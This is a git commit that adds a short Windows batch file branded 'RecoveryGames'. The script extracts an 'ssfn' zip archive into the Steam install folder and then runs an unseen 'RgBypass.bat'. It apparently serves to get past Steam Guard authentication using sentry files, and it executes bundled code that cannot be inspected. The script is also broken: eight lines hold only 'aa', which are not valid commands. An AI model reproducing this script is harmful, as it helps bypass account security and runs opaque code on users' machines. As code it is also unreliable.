45c86d9f9a81fa2fdacbf2d8fb3aca4ea1adc28a
fortnitebott <60422445+fortnitebott@users.noreply.github.com>
2020-11-28 20:13:02 +0300

    Add files via upload

---
+++ ssfn_RgOneClick_1.bat
@@ -0,0 +1,17 @@
+@echo off
+title RecoveryGames
+color 46
+@CHOICE /C:YN /m "RecoveryGames Presents Im ZapradowSky"
+cd\
+cd C:\Program Files (x86)\Steam
+tar -xf ssfn_RgAdminn_1.zip
+aa
+aa
+aa
+aa
+aa
+aa
+aa
+aa
+cd RgAdminn
+RgBypass.bat
